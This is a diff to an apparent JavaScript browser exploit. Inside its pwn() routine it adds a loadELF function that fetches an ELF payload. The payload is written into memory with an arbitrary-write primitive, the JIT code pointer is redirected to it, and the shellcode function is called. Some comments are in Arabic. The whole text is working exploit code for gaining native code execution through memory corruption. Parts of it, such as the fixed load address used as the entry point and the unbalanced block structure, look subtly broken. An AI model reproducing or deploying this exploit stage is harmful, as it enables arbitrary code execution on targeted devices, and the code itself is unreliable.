@@ -252,6 +252,28 @@ function millis(ms)
 
 var shellcodeFunc = MakeJitCompiledFunction();
 
+function loadELF(url) {
+    return new Promise((resolve, reject) => {
+        let xhr = new XMLHttpRequest();
+        xhr.open("GET", url, true);
+        xhr.responseType = "arraybuffer";
+
+        xhr.onload = function () {
+            if (xhr.status === 200) {
+                resolve(new Uint8Array(xhr.response));
+            } else {
+                reject("Failed to load ELF file.");
+            }
+        };
+
+        xhr.onerror = function () {
+            reject("Error loading ELF file.");
+        };
+
+        xhr.send();
+    });
+}
+
 function pwn() {
 
     let noCoW = 13.37;
@@ -425,7 +447,22 @@ function pwn() {
 
     log('[*] Executed stage1.bin!');
 
+// تحميل ELF
+    log("[*] Loading ELF Loader...");
+    loadELF("elfldr.elf").then(payload => {
+        let elfAddr = 0x400000; // عنوان تحميل ELF في الذاكرة
+        ArbitraryWrite(elfAddr, payload);
+    log("[*] ELF Loaded at: " + elfAddr.toString(16));
+
+    let entryPoint = elfAddr; // قم بتعديله إذا كان هناك نقطة دخول مختلفة
+    log("[*] Jumping to ELF entry point...");
+    
+    write64(JITCode, entryPoint);
     shellcodeFunc();
 
-    log("[*] Done!");
+    log("[*] ELF executed successfully!");
+}).catch(err => {
+    log("[!] ELF Loading failed: " + err);
+});
+    
 }
